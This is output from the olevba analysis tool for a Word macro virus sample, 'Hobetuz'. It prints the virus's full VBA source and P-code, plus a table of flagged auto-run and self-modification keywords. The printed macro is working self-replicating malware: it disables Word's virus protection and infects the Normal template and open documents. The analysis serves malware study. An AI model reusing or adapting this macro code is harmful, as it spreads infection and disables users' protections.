olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hobetuz
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hobetuz - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Sub AutoOpen()
   On Error GoTo Salir
   Dim LineasPlantilla As Integer, LineasDoc As Integer
   
   Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False
   LineasDoc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   LineasPlantilla = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   If LineasPlantilla > 10 And LineasDoc > 10 Then GoTo Salir
   If LineasPlantilla < 10 Then
      ActiveDocument.VBProject.VBComponents.Item(1).Name = NormalTemplate.VBProject.VBComponents.Item(1).Name
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
      NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 3, "Sub AutoClose()"
   Else
      If LineasDoc = 0 Then
         ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
         ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
         ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 3, "Sub AutoOpen()"
      End If
   End If
   If (Len(ActiveDocument.Name) > 20) Then MsgBox "I'm sorry, you gotta virus", 48, "(======Hobetuz======)  ;-)"
Salir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Hobetuz
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2621 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	OnError Salir 
' Line #4:
' 	Dim 
' 	VarDefn LineasPlantilla (As Integer)
' 	VarDefn LineasDoc (As Integer)
' Line #5:
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LineasDoc 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LineasPlantilla 
' Line #9:
' 	Ld LineasPlantilla 
' 	LitDI2 0x000A 
' 	Gt 
' 	Ld LineasDoc 
' 	LitDI2 0x000A 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Salir 
' 	EndIf 
' Line #10:
' 	Ld LineasPlantilla 
' 	LitDI2 0x000A 
' 	Lt 
' 	IfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #13:
' 	LitDI2 0x0003 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	Ld LineasDoc 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #18:
' 	LitDI2 0x0003 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Gt 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001A "I'm sorry, you gotta virus"
' 	LitDI2 0x0030 
' 	LitStr 0x001A "(======Hobetuz======)  ;-)"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #22:
' 	Label Salir 
' Line #23:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

